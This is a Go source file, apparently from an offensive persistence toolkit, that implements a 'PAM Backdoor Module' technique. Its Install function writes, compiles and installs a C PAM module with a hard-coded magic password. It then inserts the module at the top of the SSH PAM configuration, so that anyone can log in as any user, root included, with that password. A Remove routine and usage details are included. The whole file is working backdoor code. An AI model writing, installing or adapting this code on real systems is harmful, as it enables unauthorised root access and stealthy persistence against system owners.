//go:build linux

package techniques

import (
	"fmt"
	"os"
	"os/exec"
)

type PAMBackdoor struct {
	pamModule string
}

func NewPAMBackdoor() Technique {
	return &PAMBackdoor{
		pamModule: "/lib/security/pam_backdoor.so",
	}
}

func (p *PAMBackdoor) Name() string {
	return "PAM Backdoor Module"
}

func (p *PAMBackdoor) Description() string {
	return "PAM authentication bypass with magic password"
}

func (p *PAMBackdoor) StealthLevel() string {
	return "high"
}

func (p *PAMBackdoor) SurvivesReboot() bool {
	return true
}

func (p *PAMBackdoor) Install() error {
	// Create PAM backdoor module
	sourceCode := `#include <security/pam_modules.h>
#include <string.h>
#include <syslog.h>

#define MAGIC_PASSWORD "JudoziBackdoor2026!"

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,
                                   int argc, const char **argv) {
    const char *password;
    int pam_err;
    
    pam_err = pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);
    
    if (pam_err != PAM_SUCCESS) {
        return PAM_AUTH_ERR;
    }
    
    if (strcmp(password, MAGIC_PASSWORD) == 0) {
        return PAM_SUCCESS;
    }
    
    return PAM_IGNORE;
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags,
                              int argc, const char **argv) {
    return PAM_SUCCESS;
}
`
	
	tmpSource := "/tmp/pam_backdoor.c"
	if err := os.WriteFile(tmpSource, []byte(sourceCode), 0644); err != nil {
		return fmt.Errorf("write source: %w", err)
	}
	
	// Compile PAM module
	cmd := exec.Command("gcc", "-fPIC", "-shared", "-o", p.pamModule, tmpSource, "-lpam")
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("compile PAM module: %w", err)
	}
	
	// Add to PAM configuration (SSH)
	pamConfig := "/etc/pam.d/sshd"
	content, err := os.ReadFile(pamConfig)
	if err != nil {
		return fmt.Errorf("read PAM config: %w", err)
	}
	
	// Insert our module at the top
	newContent := "auth sufficient pam_backdoor.so\n" + string(content)
	
	if err := os.WriteFile(pamConfig, []byte(newContent), 0644); err != nil {
		return fmt.Errorf("write PAM config: %w", err)
	}
	
	os.Remove(tmpSource)
	
	return nil
}

func (p *PAMBackdoor) Remove() error {
	// Remove from PAM config
	pamConfig := "/etc/pam.d/sshd"
	data, err := os.ReadFile(pamConfig)
	if err != nil {
		return err
	}
	
	lines := []string{}
	for _, line := range splitLines(string(data)) {
		if !contains(line, "pam_backdoor.so") {
			lines = append(lines, line)
		}
	}
	
	os.WriteFile(pamConfig, []byte(joinLines(lines)), 0644)
	os.Remove(p.pamModule)
	
	return nil
}

func (p *PAMBackdoor) Details() string {
	return `PAM backdoor module installed: /lib/security/pam_backdoor.so
Configuration: /etc/pam.d/sshd

Magic password: JudoziBackdoor2026!

You can now SSH as any user with the magic password:
  ssh root@localhost
  Password: JudoziBackdoor2026!

The backdoor works for SSH authentication.
`
}
